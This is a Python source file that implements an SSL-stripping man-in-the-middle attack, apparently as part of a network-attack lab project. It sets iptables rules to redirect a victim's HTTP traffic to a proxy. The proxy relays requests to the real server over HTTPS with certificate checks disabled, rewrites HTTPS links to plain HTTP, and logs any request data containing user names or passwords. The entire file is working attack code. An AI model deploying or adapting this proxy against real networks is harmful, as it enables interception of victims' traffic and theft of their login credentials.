"""
SSL stripping attack module
"""

import subprocess
import threading
import time
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib3

from common import (
    cleanup_iptables,
    log_packet,
    WEB_SERVER_IP, 
    SPOOF_DOMAIN, 
    SSL_STRIP_PROXY_PORT
)

# Disable SSL warnings for self-signed certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SSL Stripping Proxy
class SSLStripProxy(BaseHTTPRequestHandler):
    """HTTP Proxy that performs SSL stripping
    1. Recives HTTP requests from victim
    2. Forwards them to target server over HTTPS
    3. Logs found credentials
    """
    
    target_server = f"https://{WEB_SERVER_IP}"
    
    def log_message(self, format, *args):
        """Suppress default HTTP server logging"""
        pass 
    
    def log_proxy_request(self, method, path, headers_dict):
        """Log detailed proxy request to file"""
        details = f"Method: {method}\n"
        details += f"Path: {path}\n"
        details += f"Target: {self.target_server}{path}\n"
        details += "Headers:\n"
        for key, value in headers_dict.items():
            details += f"  {key}: {value}\n"
        
        log_packet(f"[SSL STRIP REQUEST] {method} {path}", details)
    
    def log_proxy_response(self, status_code, headers_dict, body=""):
        """Log detailed proxy response to file"""
        details = f"Status: {status_code}\n"
        details += "Response Headers:\n"
        for key, value in headers_dict.items():
            details += f"  {key}: {value}\n"
        
        log_packet(f"[SSL STRIP RESPONSE] Status {status_code}", details, body=body[:1000] if body else None)
    
    def check_for_credentials(self, data, source=""):
        """Check request data for credentials and log them"""
        if not data:
            return
            
        data_lower = data.lower()
        keywords = ['user', 'password']
        
        # If keywords appear in the data print them to console and add to log file
        if any(kw in data_lower for kw in keywords):
            print(f"[CREDENTIALS CAPTURED] {data[:100]}")
            
            # Log to file with full details
            log_packet(f"[CREDENTIALS CAPTURED] {source}",None, data[:1000])

    
    def strip_ssl(self, content):
        """Strip HTTPS links and security headers from content"""
        if isinstance(content, bytes):
            content = content.replace(b'https://', b'http://')
        return content
    
    def do_GET(self):
        self.proxy_request('GET')
    
    def proxy_request(self, method):
        """Forward request to real server over HTTPS and return stripped response"""
        try:
            target_url = f"{self.target_server}{self.path}"
            print(f"[SSL STRIP REQUEST] {method} {self.path} -> {target_url}")
            
            # Check URL parameters for credentials
            if '?' in self.path:
                query_string = self.path.split('?', 1)[1]
                self.check_for_credentials(query_string, source=f"URL params: {self.path}")
            
            body = None
            
            # Prepare headers
            headers = {}
            for key, value in self.headers.items():
                if key.lower() not in ['host', 'connection', 'keep-alive', 'transfer-encoding']:
                    headers[key] = value
            headers['Host'] = SPOOF_DOMAIN
            
            # Log the request with full details to file
            self.log_proxy_request(method, self.path, headers)
            
            # Make request to real HTTPS server
            response = requests.request(
                method=method,
                url=target_url,
                headers=headers,
                data=body,
                verify=False,
                allow_redirects=False,
                timeout=10
            )
            
            # Send response status
            self.send_response(response.status_code)
            
            response_headers = {}
            
            # Process and send response headers
            for key, value in response.headers.items():
                response_headers[key] = value
                self.send_header(key, value)
            
            self.end_headers()
            
            # Strip SSL from response body and send
            content = self.strip_ssl(response.content)
            self.wfile.write(content)
            
            # Decode response body for logging
            content_str = content.decode('utf-8', errors='ignore')
            
            # Print response to console
            print(f"[SSL STRIP RESPONSE] Status {response.status_code} | Body: {content_str[:200]}")
            
            # Log the response with full details to file (including body)
            self.log_proxy_response(response.status_code, response_headers, content_str)

        except Exception as e:
            print(f"[ERROR] Proxy server error: {e}")


# IPTables Setup
def setup_ssl_iptables():
    """Setup iptables to redirect HTTP traffic to proxy server"""
    # Flush existing IPtables rules
    cleanup_iptables()
    
    # Redirect HTTP traffic (port 80) to proxy server
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", 
                   "--dport", "80", "-j", "REDIRECT", "--to-port", str(SSL_STRIP_PROXY_PORT)], 
                   capture_output=True)
    
    # Forward everything else
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "ACCEPT"], capture_output=True)
    
    print(f"+ IPtables rules configured for SSL stripping")


# SSL Stripping Functions
def start_ssl_strip_proxy(port=SSL_STRIP_PROXY_PORT):
    """Start the SSL stripping proxy server"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, SSLStripProxy)
    httpd.serve_forever()

    print("+ SSL strip attack ready")
    print(f"+ SSL Strip Proxy started on port {port}")
    print(f"+ Forwarding traffic to: https://{WEB_SERVER_IP}")
    

def run_ssl_stripping():
    """Start SSL stripping attack"""
    # Setup iptables
    setup_ssl_iptables()
    
    # Start proxy server thread
    proxy_thread = threading.Thread(target=start_ssl_strip_proxy, daemon=True)
    proxy_thread.start()
    return proxy_thread
